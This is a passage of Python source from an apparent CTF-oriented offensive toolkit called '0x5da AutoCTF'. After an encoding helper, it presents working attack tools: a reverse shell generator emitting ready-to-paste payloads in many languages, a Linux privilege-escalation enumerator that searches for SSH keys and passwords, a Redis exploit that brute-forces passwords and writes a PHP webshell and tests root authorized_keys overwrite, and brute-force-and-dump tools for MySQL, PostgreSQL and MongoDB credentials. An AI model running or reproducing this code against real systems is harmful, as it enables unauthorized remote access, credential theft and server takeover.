            result = base64.b64decode(text).decode("utf-8", errors="replace")
            success(f"Decoded: {result}")
        except Exception:
            error("Invalid Base64")
    elif choice == "3":
        result = text.encode().hex()
        success(f"Hex: {result}")
    elif choice == "4":
        try:
            result = bytes.fromhex(text.replace(" ", "").replace("0x", "")).decode("utf-8", errors="replace")
            success(f"Decoded: {result}")
        except Exception:
            error("Invalid hex string")
    elif choice == "5":
        result = urllib.parse.quote(text)
        success(f"URL Encoded: {result}")
    elif choice == "6":
        result = urllib.parse.unquote(text)
        success(f"URL Decoded: {result}")
    elif choice == "7":
        result = codecs.encode(text, "rot_13")
        success(f"ROT13: {result}")
    elif choice == "8":
        subheader("Caesar Cipher Brute Force")
        for shift in range(1, 26):
            decoded = ""
            for ch in text:
                if ch.isalpha():
                    base = ord("A") if ch.isupper() else ord("a")
                    decoded += chr((ord(ch) - base - shift) % 26 + base)
                else:
                    decoded += ch
            print(f"    {C.CY}[Shift {shift:>2}]{C.RST} {decoded}")
    elif choice == "9":
        result = " ".join(format(ord(c), "08b") for c in text)
        success(f"Binary: {result}")
    elif choice == "10":
        try:
            bits = text.replace(" ", "")
            result = "".join(chr(int(bits[i:i+8], 2)) for i in range(0, len(bits), 8))
            success(f"Decoded: {result}")
        except Exception:
            error("Invalid binary string")
    elif choice == "11":
        subheader("Magic Auto-Decode")
        info(f"Input: {text[:80]}")
        try:
            decoded = base64.b64decode(text).decode("utf-8", errors="replace")
            success(f"Base64 → {decoded[:100]}")
        except Exception:
            pass
        try:
            decoded = bytes.fromhex(text.replace(" ", "")).decode("utf-8", errors="replace")
            success(f"Hex → {decoded[:100]}")
        except Exception:
            pass
        decoded = codecs.encode(text, "rot_13")
        success(f"ROT13 → {decoded[:100]}")
        decoded = urllib.parse.unquote(text)
        if decoded != text:
            success(f"URL → {decoded[:100]}")
        try:
            bits = text.replace(" ", "")
            if all(c in "01" for c in bits) and len(bits) % 8 == 0:
                decoded = "".join(chr(int(bits[i:i+8], 2)) for i in range(0, len(bits), 8))
                success(f"Binary → {decoded[:100]}")
        except Exception:
            pass
        for depth in range(2, 5):
            try:
                result = text
                for _ in range(depth):
                    result = base64.b64decode(result).decode("utf-8", errors="replace")
                if result.isprintable():
                    success(f"Base64 ×{depth} → {result[:100]}")
            except Exception:
                break

    print(f"\n  {C.DIM}0x5da Crypto Toolkit (WoahToast){C.RST}")


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL 21: REVERSE SHELL GENERATOR — 0x5da (Toasty)
# ═══════════════════════════════════════════════════════════════════════════════

def tool_shell_generator():
    """
    0x5da Reverse Shell Generator — Generates ready-to-use reverse shell
    payloads for 15+ languages and tools. Created by 0x5da (Toasty).
    """
    header("0x5da Reverse Shell Generator")

    lhost = input(f"  {C.W}LHOST (your IP):{C.RST} ").strip()
    lport = input(f"  {C.W}LPORT (your port):{C.RST} ").strip()
    if not lhost or not lport:
        error("LHOST and LPORT are required")
        return

    shells = OrderedDict()

    shells["Bash TCP"] = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    shells["Bash UDP"] = f"bash -i >& /dev/udp/{lhost}/{lport} 0>&1"
    shells["Bash mkfifo"] = (f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|"
                             f"nc {lhost} {lport} >/tmp/f")

    shells["Python"] = (f"python -c 'import socket,subprocess,os;"
                        f's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
                        f's.connect(("{lhost}",{lport}));'
                        f'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);'
                        f'os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'')
    shells["Python3"] = (f"python3 -c 'import socket,subprocess,os;"
                         f's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
                         f's.connect(("{lhost}",{lport}));'
                         f'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);'
                         f'os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'')

    shells["PHP"] = (f"php -r '$sock=fsockopen(\"{lhost}\",{lport});"
                     f"exec(\"/bin/sh -i <&3 >&3 2>&3\");'")
    shells["PHP (exec)"] = (f"php -r '$sock=fsockopen(\"{lhost}\",{lport});"
                            f"$proc=proc_open(\"/bin/sh -i\",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'")

    shells["Perl"] = (f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
                      f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                      f"if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");"
                      f"open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\")}};'")

    shells["Ruby"] = (f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;"
                      f"exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'")

    shells["Netcat (traditional)"] = f"nc -e /bin/sh {lhost} {lport}"
    shells["Netcat (OpenBSD)"] = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
    shells["Ncat (SSL)"] = f"ncat --ssl {lhost} {lport} -e /bin/sh"

    shells["Socat"] = f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}"
    shells["Socat (Listener)"] = f"socat file:`tty`,raw,echo=0 tcp-listen:{lport}"

    shells["PowerShell"] = (f"powershell -nop -c \"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
                            f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0)"
                            f"{{$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
                            f"$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';"
                            f"$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()\"")

    shells["Java"] = (f"Runtime r=Runtime.getRuntime();Process p=r.exec(new String[]{{\"/bin/bash\",\"-c\","
                      f"\"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"}});p.waitFor();")

    shells["Lua"] = (f"lua -e \"require('socket');require('os');"
                     f"t=socket.tcp();t:connect('{lhost}','{lport}');"
                     f"os.execute('/bin/sh -i <&3 >&3 2>&3');\"")

    shells["Awk"] = (f"awk 'BEGIN {{s=\"/inet/tcp/0/{lhost}/{lport}\";while(42)"
                     f"{{do{{printf \"shell>\" |& s;s |& getline c;if(c)"
                     f"{{while((c |& getline)>0) print $0 |& s;close(c)}}}} while(c!=\"exit\")"
                     f";close(s)}}}}'")

    subheader("Generated Reverse Shell Payloads")
    print(f"  {C.DIM}LHOST: {lhost}  LPORT: {lport}{C.RST}\n")

    for name, payload in shells.items():
        print(f"  {C.G}● {name}{C.RST}")
        print(f"    {C.W}{payload}{C.RST}\n")

    subheader("Listener Commands")
    print(f"  {C.Y}Netcat:{C.RST}   nc -lvnp {lport}")
    print(f"  {C.Y}Socat:{C.RST}    socat file:`tty`,raw,echo=0 tcp-listen:{lport}")
    print(f"  {C.Y}pwncat:{C.RST}   pwncat-cs -lp {lport}")
    print(f"  {C.Y}rlwrap:{C.RST}   rlwrap nc -lvnp {lport}")

    subheader("Shell Upgrade (after catching)")
    print(f"  {C.CY}python3 -c 'import pty;pty.spawn(\"/bin/bash\")'")
    print(f"  Ctrl+Z")
    print(f"  stty raw -echo; fg")
    print(f"  export TERM=xterm{C.RST}")

    print(f"\n  {C.DIM}Generated by 0x5da AutoCTF (Toasty){C.RST}")
    return shells


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL 22: PRIVILEGE ESCALATION ENUMERATOR — 0x5da (OsintToast)
# ═══════════════════════════════════════════════════════════════════════════════

def tool_privesc_enum(local=False):
    """
    0x5da PrivEsc Enumerator — Linux privilege escalation enumeration.
    Generates commands to find SUID, capabilities, cron, misconfigs.
    Can run locally or generate a script for the target.
    """
    header("0x5da Linux Privilege Escalation Enumerator")

    checks = OrderedDict()

    checks["System Info"] = [
        ("uname -a", "Kernel version"),
        ("cat /etc/os-release 2>/dev/null || cat /etc/*release 2>/dev/null", "OS version"),
        ("hostname", "Hostname"),
        ("id", "Current user"),
        ("whoami", "Current username"),
        ("echo $PATH", "PATH variable"),
    ]

    checks["SUID Binaries"] = [
        ("find / -perm -4000 -type f 2>/dev/null", "SUID files"),
        ("find / -perm -2000 -type f 2>/dev/null", "SGID files"),
    ]

    checks["Capabilities"] = [
        ("getcap -r / 2>/dev/null", "Files with capabilities"),
    ]

    checks["Sudo Rights"] = [
        ("sudo -l 2>/dev/null", "Sudo permissions"),
        ("cat /etc/sudoers 2>/dev/null", "Sudoers file"),
    ]

    checks["Cron Jobs"] = [
        ("cat /etc/crontab 2>/dev/null", "System crontab"),
        ("ls -la /etc/cron.d/ 2>/dev/null", "Cron.d directory"),
        ("ls -la /etc/cron.daily/ 2>/dev/null", "Daily cron"),
        ("ls -la /var/spool/cron/crontabs/ 2>/dev/null", "User crontabs"),
        ("crontab -l 2>/dev/null", "Current user crontab"),
    ]

    checks["Writable Files/Dirs"] = [
        ("find /etc -writable -type f 2>/dev/null", "Writable /etc files"),
        ("ls -la /etc/passwd", "/etc/passwd permissions"),
        ("ls -la /etc/shadow", "/etc/shadow permissions"),
        ("find / -writable -type d 2>/dev/null | grep -v proc", "Writable directories"),
    ]

    checks["Interesting Files"] = [
        ("find / -name '*.txt' -o -name '*.log' -o -name '*.bak' -o -name '*.conf' 2>/dev/null | head -30",
         "Config/log/backup files"),
        ("find / -name 'id_rsa' -o -name 'id_dsa' -o -name '*.pem' 2>/dev/null",
         "SSH keys and certificates"),
        ("find /home -name '.bash_history' 2>/dev/null", "Bash history files"),
        ("find / -name 'wp-config.php' -o -name 'config.php' -o -name '.env' 2>/dev/null",
         "Web config files"),
    ]

    checks["Network"] = [
        ("ip addr show 2>/dev/null || ifconfig", "Network interfaces"),
        ("ss -tulnp 2>/dev/null || netstat -tulnp 2>/dev/null", "Listening ports"),
        ("cat /etc/hosts", "Hosts file"),
        ("arp -a 2>/dev/null", "ARP table"),
    ]

    checks["Processes"] = [
        ("ps auxf", "Running processes"),
        ("cat /proc/version", "Kernel version detail"),
    ]

    checks["Docker/LXC"] = [
        ("id | grep -i docker", "Docker group membership"),
        ("ls -la /var/run/docker.sock 2>/dev/null", "Docker socket"),
        ("cat /proc/1/cgroup 2>/dev/null | grep -i docker", "Running in container?"),
        ("capsh --print 2>/dev/null", "Current capabilities"),
    ]

    checks["Password Hunting"] = [
        ("grep -r 'password' /var/www/ 2>/dev/null | head -10", "Passwords in web files"),
        ("grep -r 'password' /opt/ 2>/dev/null | head -10", "Passwords in /opt"),
        ("grep -r 'DB_PASSWORD\\|DB_PASS' /var/www/ 2>/dev/null", "DB passwords"),
        ("cat /var/www/html/wp-config.php 2>/dev/null | grep -i pass", "WordPress DB password"),
    ]

    if local:
        info("Running privilege escalation checks locally...")
        results = {}
        for category, cmds in checks.items():
            subheader(category)
            for cmd, desc in cmds:
                try:
                    out = subprocess.check_output(
                        cmd, shell=True, stderr=subprocess.DEVNULL, timeout=15
                    ).decode("utf-8", errors="replace").strip()
                    if out:
                        results[desc] = out
                        success(f"{desc}:")
                        for line in out.split("\n")[:15]:
                            print(f"    {C.W}{line}{C.RST}")
                        if out.count("\n") > 15:
                            info(f"  ... {out.count(chr(10)) - 15} more lines")
                except Exception:
                    pass
        return results
    else:
        info("Generating privesc enumeration script for target...")
        script_lines = [
            "#!/bin/bash",
            f"# 0x5da PrivEsc Enumerator — Generated by AutoCTF ({__built_by__})",
            f"# Timestamp: {datetime.now().isoformat()}",
            'echo "============================================"',
            'echo " 0x5da PrivEsc Enumerator"',
            'echo " Created by 0x5da (Toasty / OsintToast)"',
            'echo "============================================"',
            "",
        ]
        for category, cmds in checks.items():
            script_lines.append(f'echo ""')
            script_lines.append(f'echo "=== {category} ==="')
            for cmd, desc in cmds:
                script_lines.append(f'echo "--- {desc} ---"')
                script_lines.append(f'{cmd} 2>/dev/null')
            script_lines.append("")

        script = "\n".join(script_lines)
        filename = f"0x5da_privesc_{datetime.now().strftime('%Y%m%d_%H%M%S')}.sh"
        with open(filename, "w") as f:
            f.write(script)
        os.chmod(filename, 0o755)
        success(f"Script saved: {filename}")
        info("Transfer to target and run: bash " + filename)
        print(f"\n  {C.Y}Quick paste (one-liner):{C.RST}")
        oneliner = (
            "echo '#!/bin/bash' > /tmp/pe.sh && "
            "echo 'id && uname -a && cat /etc/os-release' >> /tmp/pe.sh && "
            "echo 'find / -perm -4000 -type f 2>/dev/null' >> /tmp/pe.sh && "
            "echo 'getcap -r / 2>/dev/null' >> /tmp/pe.sh && "
            "echo 'sudo -l 2>/dev/null' >> /tmp/pe.sh && "
            "echo 'cat /etc/crontab 2>/dev/null' >> /tmp/pe.sh && "
            "echo 'find /etc -writable -type f 2>/dev/null' >> /tmp/pe.sh && "
            "echo 'ss -tulnp 2>/dev/null' >> /tmp/pe.sh && "
            "bash /tmp/pe.sh"
        )
        print(f"  {C.DIM}{oneliner}{C.RST}")

    print(f"\n  {C.DIM}0x5da PrivEsc Enumerator (OsintToast){C.RST}")


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL 23: REDIS EXPLOIT — 0x5da (Toasty)
#  Unauthenticated Redis access → info dump, key dump, credential harvest,
#  webshell write, SSH key injection. All original code by 0x5da.
# ═══════════════════════════════════════════════════════════════════════════════

def _redis_cmd(host, port, *args, timeout=5):
    """Send a raw RESP command to Redis and return the response."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        cmd = f"*{len(args)}\r\n"
        for a in args:
            cmd += f"${len(str(a))}\r\n{a}\r\n"
        s.sendall(cmd.encode())
        data = b""
        while True:
            try:
                chunk = s.recv(4096)
                if not chunk:
                    break
                data += chunk
                if len(chunk) < 4096:
                    break
            except socket.timeout:
                break
        s.close()
        return data.decode("utf-8", errors="replace")
    except Exception:
        return None


def tool_redis_exploit(target, port=6379):
    """
    0x5da Redis Exploit — Checks for unauthenticated Redis access, dumps
    server info, enumerates all keys/databases, extracts credentials and
    sensitive data, attempts webshell write and SSH key injection.
    Written entirely by 0x5da (Toasty / OsintToast / WoahToast).
    """
    header(f"0x5da Redis Exploit → {target}:{port}")
    findings = {"auth_required": True, "info": {}, "keys": [], "credentials": [], "rce": []}

    if not tcp_connect(target, port, timeout=3):
        error(f"Port {port} is closed")
        return findings

    subheader("Authentication Check")
    resp = _redis_cmd(target, port, "PING")
    if resp is None:
        error("Connection failed")
        return findings

    if "NOAUTH" in resp or "ERR" in resp:
        info("Authentication required — trying common passwords")
        redis_passwords = ["", "redis", "password", "admin", "root", "default",
                           "changeme", "letmein", "123456", "foobared", "requirepass"]
        for pw in redis_passwords:
            r = _redis_cmd(target, port, "AUTH", pw)
            if r and "+OK" in r:
                findings["auth_required"] = False
                findings["credentials"].append(("redis", pw or "(blank)"))
                success(f"{C.R}AUTH BYPASS!{C.RST} Password: {C.G}{pw or '(blank)'}{C.RST}")
                break
        if findings["auth_required"]:
            error("Could not authenticate")
            return findings
    elif "+PONG" in resp:
        findings["auth_required"] = False
        success(f"{C.R}NO AUTH REQUIRED!{C.RST} Redis is wide open")

    subheader("Server Info Extraction")
    info_resp = _redis_cmd(target, port, "INFO")
    if info_resp:
        for field in ["redis_version", "os", "tcp_port", "uptime_in_days",
                       "connected_clients", "used_memory_human", "role",
                       "executable", "config_file"]:
            match = re.search(rf"{field}:(.+?)[\r\n]", info_resp)
            if match:
                val = match.group(1).strip()
                findings["info"][field] = val
                success(f"{field}: {val}")

    subheader("Database & Key Enumeration")
    for db in range(16):
        _redis_cmd(target, port, "SELECT", str(db))
        dbsize_resp = _redis_cmd(target, port, "DBSIZE")
        if dbsize_resp and ":0" not in dbsize_resp:
            count_match = re.search(r":(\d+)", dbsize_resp)
            count = count_match.group(1) if count_match else "?"
            info(f"DB {db}: {count} keys")

            keys_resp = _redis_cmd(target, port, "KEYS", "*")
            if keys_resp:
                key_list = [k.strip() for k in keys_resp.split("\n")
                            if k.strip() and not k.startswith("*") and not k.startswith("$")]
                for key in key_list[:50]:
                    findings["keys"].append((db, key))
                    val_resp = _redis_cmd(target, port, "GET", key)
                    val_preview = ""
                    if val_resp:
                        lines = val_resp.strip().split("\n")
                        val_preview = lines[-1][:120] if lines else ""
                    print(f"    {C.CY}[db{db}]{C.RST} {key}")
                    if val_preview:
                        print(f"          {C.DIM}{val_preview}{C.RST}")
                    kl = key.lower()
                    vl = val_preview.lower()
                    if any(w in kl or w in vl for w in
                           ["pass", "secret", "token", "key", "cred", "auth",
                            "session", "cookie", "api_key", "private", "flag"]):
                        findings["credentials"].append((key, val_preview))
                        success(f"{C.R}SENSITIVE KEY:{C.RST} {key} = {val_preview[:80]}")

    subheader("Config Extraction")
    for conf_key in ["requirepass", "masterauth", "dir", "dbfilename",
                     "logfile", "bind", "slaveof"]:
        r = _redis_cmd(target, port, "CONFIG", "GET", conf_key)
        if r and conf_key in r:
            lines = [l.strip() for l in r.split("\n") if l.strip()
                     and not l.startswith("*") and not l.startswith("$")]
            if len(lines) >= 2:
                info(f"CONFIG {conf_key} = {lines[-1]}")
                if conf_key in ("requirepass", "masterauth") and lines[-1]:
                    findings["credentials"].append((conf_key, lines[-1]))

    subheader("RCE Vectors")
    dir_resp = _redis_cmd(target, port, "CONFIG", "GET", "dir")
    if dir_resp:
        for webroot in ["/var/www/html", "/var/www", "/usr/share/nginx/html",
                        "/srv/http", "/var/www/public"]:
            info(f"Checking webshell write to {webroot}...")
            _redis_cmd(target, port, "CONFIG", "SET", "dir", webroot)
            _redis_cmd(target, port, "CONFIG", "SET", "dbfilename", "0x5da_test.php")
            _redis_cmd(target, port, "SET", "0x5da_rce",
                       '<?php echo "0x5da_rce_confirmed"; system($_GET["cmd"]); ?>')
            r = _redis_cmd(target, port, "SAVE")
            if r and "+OK" in r:
                findings["rce"].append(f"Webshell potentially written: {webroot}/0x5da_test.php")
                success(f"{C.R}WEBSHELL WRITE:{C.RST} {webroot}/0x5da_test.php")
                _redis_cmd(target, port, "DEL", "0x5da_rce")

        info("Checking SSH key injection to /root/.ssh/...")
        _redis_cmd(target, port, "CONFIG", "SET", "dir", "/root/.ssh")
        _redis_cmd(target, port, "CONFIG", "SET", "dbfilename", "authorized_keys")
        r = _redis_cmd(target, port, "SAVE")
        if r and "+OK" in r:
            findings["rce"].append("SSH authorized_keys writable in /root/.ssh/")
            success(f"{C.R}SSH KEY INJECTION POSSIBLE{C.RST} → /root/.ssh/authorized_keys writable")

    if dir_resp:
        dir_lines = [l.strip() for l in dir_resp.split("\n") if l.strip()
                     and not l.startswith("*") and not l.startswith("$")]
        orig_dir = dir_lines[-1] if len(dir_lines) >= 2 else "/tmp"
        _redis_cmd(target, port, "CONFIG", "SET", "dir", orig_dir)
        _redis_cmd(target, port, "CONFIG", "SET", "dbfilename", "dump.rdb")

    print(f"\n  {C.DIM}Redis exploited by 0x5da AutoCTF (Toasty){C.RST}")
    return findings


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL 24: MYSQL / POSTGRESQL BRUTE + DUMP — 0x5da (OsintToast)
#  Default credential brute force and database/table/credential dump.
#  All original code by 0x5da (Toasty / OsintToast / WoahToast).
# ═══════════════════════════════════════════════════════════════════════════════

DB_CREDS = [
    ("root", ""), ("root", "root"), ("root", "toor"), ("root", "password"),
    ("root", "mysql"), ("root", "admin"), ("root", "123456"),
    ("admin", "admin"), ("admin", "password"), ("admin", ""),
    ("mysql", "mysql"), ("postgres", "postgres"), ("postgres", "password"),
    ("postgres", "admin"), ("postgres", ""), ("dbadmin", "dbadmin"),
    ("user", "user"), ("test", "test"), ("guest", "guest"),
    ("sa", ""), ("sa", "sa"), ("sa", "password"), ("sa", "P@ssw0rd"),
]


def tool_db_brute(target, port=None, db_type="auto"):
    """
    0x5da DB Brute + Dump — Brute-forces MySQL/MariaDB and PostgreSQL with
    default credentials, then dumps databases, tables, users, and password
    hashes. All original code by 0x5da (Toasty / OsintToast / WoahToast).
    """
    header(f"0x5da Database Brute + Dump → {target}")
    findings = {"mysql": {"credentials": [], "databases": [], "users": []},
                "postgres": {"credentials": [], "databases": [], "users": []}}

    mysql_port = port or 3306
    pg_port = port or 5432
    do_mysql = db_type in ("auto", "mysql") and tcp_connect(target, mysql_port, 2)
    do_pg = db_type in ("auto", "postgres") and tcp_connect(target, pg_port, 2)

    if do_mysql:
        subheader(f"MySQL/MariaDB Brute Force (port {mysql_port})")
        try:
            import pymysql
        except ImportError:
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install",
                                       "pymysql", "-q"], stderr=subprocess.DEVNULL)
                import pymysql
            except Exception:
                warning("pymysql not available — trying command-line mysql client")
                pymysql = None

        if pymysql:
            for user, pw in DB_CREDS:
                try:
                    conn = pymysql.connect(host=target, port=mysql_port,
                                           user=user, password=pw,
                                           connect_timeout=5)
                    findings["mysql"]["credentials"].append((user, pw))
                    success(f"{C.R}MYSQL LOGIN:{C.RST} {C.G}{user}:{pw or '(blank)'}{C.RST}")
                    cur = conn.cursor()
                    cur.execute("SHOW DATABASES")
                    for (db_name,) in cur.fetchall():
                        findings["mysql"]["databases"].append(db_name)
                    info(f"Databases: {', '.join(findings['mysql']['databases'])}")

                    cur.execute("SELECT user, host, authentication_string FROM mysql.user")
                    for row in cur.fetchall():
                        u, h, auth = row[0], row[1], row[2] or ""
                        findings["mysql"]["users"].append({"user": u, "host": h, "hash": auth})
                        success(f"  MySQL user: {u}@{h}  hash={auth[:50]}")

                    for db_name in findings["mysql"]["databases"]:
                        if db_name in ("information_schema", "performance_schema",
                                       "sys", "mysql"):
                            continue
                        try:
                            cur.execute(f"USE `{db_name}`")
                            cur.execute("SHOW TABLES")
                            tables = [t[0] for t in cur.fetchall()]
                            if tables:
                                info(f"  {db_name}: tables={', '.join(tables[:20])}")
                            for tbl in tables[:10]:
                                tl = tbl.lower()
                                if any(w in tl for w in ["user", "admin", "account",
                                                         "login", "credential", "member",
                                                         "auth", "password", "flag"]):
                                    cur.execute(f"SELECT * FROM `{tbl}` LIMIT 20")
                                    cols = [d[0] for d in cur.description]
                                    rows = cur.fetchall()
                                    success(f"  {C.R}INTERESTING TABLE:{C.RST} {db_name}.{tbl} "
                                            f"({len(rows)} rows)")
                                    print(f"      {C.DIM}Columns: {', '.join(cols)}{C.RST}")
                                    for row in rows[:10]:
                                        print(f"      {C.W}{row}{C.RST}")
                                    for row in rows:
                                        for i, col in enumerate(cols):
                                            cl = col.lower()
                                            if any(w in cl for w in
                                                   ["pass", "pwd", "hash", "secret",
                                                    "token", "flag"]):
                                                findings["mysql"]["credentials"].append(
                                                    (f"{tbl}.{col}", str(row[i])))
                        except Exception:
                            pass
                    conn.close()
                    break
                except Exception:
                    pass
        else:
            for user, pw in DB_CREDS[:8]:
                try:
                    cmd = ["mysql", f"-h{target}", f"-P{mysql_port}",
                           f"-u{user}", f"-p{pw}" if pw else "--skip-password",
                           "-e", "SHOW DATABASES;"]
                    out = subprocess.check_output(cmd, stderr=subprocess.DEVNULL,
                                                  timeout=10).decode()
                    if "Database" in out:
                        findings["mysql"]["credentials"].append((user, pw))
                        success(f"{C.R}MYSQL LOGIN:{C.RST} {C.G}{user}:{pw or '(blank)'}{C.RST}")
                        info(f"Databases:\n{out}")
                        break
                except Exception:
                    pass

    if do_pg:
        subheader(f"PostgreSQL Brute Force (port {pg_port})")
        for user, pw in DB_CREDS:
            try:
                import subprocess as sp
                env = os.environ.copy()
                env["PGPASSWORD"] = pw
                env["PGCONNECT_TIMEOUT"] = "5"
                out = sp.check_output(
                    ["psql", f"-h{target}", f"-p{pg_port}", f"-U{user}",
                     "-c", "\\l", "--no-password"],
                    stderr=sp.DEVNULL, timeout=10, env=env
                ).decode()
                if "List of databases" in out or "Name" in out:
                    findings["postgres"]["credentials"].append((user, pw))
                    success(f"{C.R}POSTGRES LOGIN:{C.RST} {C.G}{user}:{pw or '(blank)'}{C.RST}")
                    for line in out.strip().split("\n"):
                        line = line.strip()
                        if line and "|" in line:
                            info(f"  {line}")

                    env2 = env.copy()
                    out2 = sp.check_output(
                        ["psql", f"-h{target}", f"-p{pg_port}", f"-U{user}",
                         "-c", "SELECT usename, passwd FROM pg_shadow",
                         "--no-password"],
                        stderr=sp.DEVNULL, timeout=10, env=env2
                    ).decode()
                    for line in out2.strip().split("\n"):
                        line = line.strip()
                        if "|" in line and "usename" not in line and "---" not in line:
                            parts = [p.strip() for p in line.split("|")]
                            if len(parts) >= 2:
                                findings["postgres"]["users"].append(
                                    {"user": parts[0], "hash": parts[1]})
                                success(f"  PG user: {parts[0]}  hash={parts[1][:50]}")
                    break
            except FileNotFoundError:
                warning("psql not installed")
                break
            except Exception:
                pass

    if not do_mysql and not do_pg:
        info("No MySQL (3306) or PostgreSQL (5432) ports open")

    print(f"\n  {C.DIM}DB exploited by 0x5da AutoCTF (OsintToast){C.RST}")
    return findings


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL 25: MONGODB EXPLOIT — 0x5da (WoahToast)
#  Unauthenticated MongoDB access, database dump, credential extraction.
#  All original code by 0x5da (Toasty / OsintToast / WoahToast).
# ═══════════════════════════════════════════════════════════════════════════════

def tool_mongo_exploit(target, port=27017):
    """
    0x5da MongoDB Exploit — Checks for unauthenticated MongoDB, enumerates
    databases and collections, extracts credentials and sensitive data.
    Written by 0x5da (Toasty / OsintToast / WoahToast).
    """
    header(f"0x5da MongoDB Exploit → {target}:{port}")
    findings = {"auth_required": True, "databases": [], "credentials": [], "collections": {}}

    if not tcp_connect(target, port, 2):
        error(f"Port {port} is closed")
        return findings

    subheader("MongoDB Wire Protocol Probe")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((target, port))

        request_id = random.randint(1, 2**31)
        query_doc = b"\x10ismaster\x00\x01\x00\x00\x00\x00"
        full_coll = b"admin.$cmd\x00"
        flags = struct.pack("<I", 0)
        skip = struct.pack("<I", 0)
        ret = struct.pack("<I", 1)
        query_body = flags + full_coll + skip + ret + query_doc
        msg_len = 16 + len(query_body)
        header_bytes = struct.pack("<IIII", msg_len, request_id, 0, 2004)
        s.sendall(header_bytes + query_body)

        resp = s.recv(4096)
        s.close()

        if resp and len(resp) > 36:
            findings["auth_required"] = False
            success(f"{C.R}MONGODB UNAUTHENTICATED ACCESS!{C.RST}")
            try:
                resp_str = resp.decode("utf-8", errors="replace")
                if "ismaster" in resp_str.lower() or "maxBsonObjectSize" in resp_str:
                    success("Server responded to ismaster query")
            except Exception:
                pass
        else:
            info("Server responded but may require auth")
    except Exception as e:
        error(f"Wire protocol probe failed: {e}")

    subheader("Mongo Shell Enumeration")
    try:
        out = subprocess.check_output(
            ["mongosh", "--host", target, "--port", str(port), "--quiet",
             "--eval", "db.adminCommand('listDatabases').databases.forEach("
                       "function(d){print(d.name+' ('+d.sizeOnDisk+' bytes)')})"],
            stderr=subprocess.DEVNULL, timeout=15
        ).decode()
        for line in out.strip().split("\n"):
            line = line.strip()
            if line:
                db_name = line.split(" ")[0]
                findings["databases"].append(db_name)
                success(f"Database: {line}")
    except FileNotFoundError:
        try:
            out = subprocess.check_output(
                ["mongo", "--host", target, "--port", str(port), "--quiet",
                 "--eval", "db.adminCommand('listDatabases').databases.forEach("
                           "function(d){print(d.name)})"],
                stderr=subprocess.DEVNULL, timeout=15
            ).decode()
            for line in out.strip().split("\n"):
                line = line.strip()
                if line:
                    findings["databases"].append(line)
                    success(f"Database: {line}")
        except Exception:
            info("mongosh/mongo CLI not available")
    except subprocess.CalledProcessError:
        info("Authentication required or command failed")
    except Exception:
        pass

    shell = "mongosh" if subprocess.run(["which", "mongosh"], capture_output=True).returncode == 0 else "mongo"
    for db_name in findings.get("databases", []):
        if db_name in ("admin", "config", "local"):
            continue
        try:
            out = subprocess.check_output(
                [shell, "--host", target, "--port", str(port), "--quiet",
                 db_name, "--eval", "db.getCollectionNames().forEach(function(c){print(c)})"],
                stderr=subprocess.DEVNULL, timeout=10
            ).decode()
            colls = [l.strip() for l in out.strip().split("\n") if l.strip()]
            findings["collections"][db_name] = colls
            if colls:
                info(f"  {db_name} collections: {', '.join(colls)}")
            for coll in colls:
                cl = coll.lower()
                if any(w in cl for w in ["user", "admin", "account", "login",
                                         "credential", "auth", "password",
                                         "member", "flag", "secret"]):
                    dump = subprocess.check_output(
                        [shell, "--host", target, "--port", str(port), "--quiet",
                         db_name, "--eval", f"db.{coll}.find().limit(20).forEach(printjson)"],
                        stderr=subprocess.DEVNULL, timeout=10
                    ).decode()
                    success(f"  {C.R}INTERESTING COLLECTION:{C.RST} {db_name}.{coll}")
                    for line in dump.strip().split("\n")[:25]:
                        print(f"      {C.W}{line}{C.RST}")
                    dl = dump.lower()
                    if any(w in dl for w in ["password", "passwd", "hash",
                                             "token", "secret", "flag"]):
                        findings["credentials"].append((f"{db_name}.{coll}", dump[:500]))
        except Exception:
            pass

    try:
        out = subprocess.check_output(
            [shell, "--host", target, "--port", str(port), "--quiet",
             "admin", "--eval",
             "db.system.users.find().forEach(function(u){"
             "print(u.user+':'+u.db+':'+(u.credentials?JSON.stringify(u.credentials):'none'))})"],
            stderr=subprocess.DEVNULL, timeout=10
        ).decode()
        for line in out.strip().split("\n"):
            if line.strip():
                findings["credentials"].append(("mongo_user", line.strip()))
                success(f"  MongoDB user: {line.strip()}")
    except Exception:
        pass

    print(f"\n  {C.DIM}MongoDB exploited by 0x5da AutoCTF (WoahToast){C.RST}")
    return findings


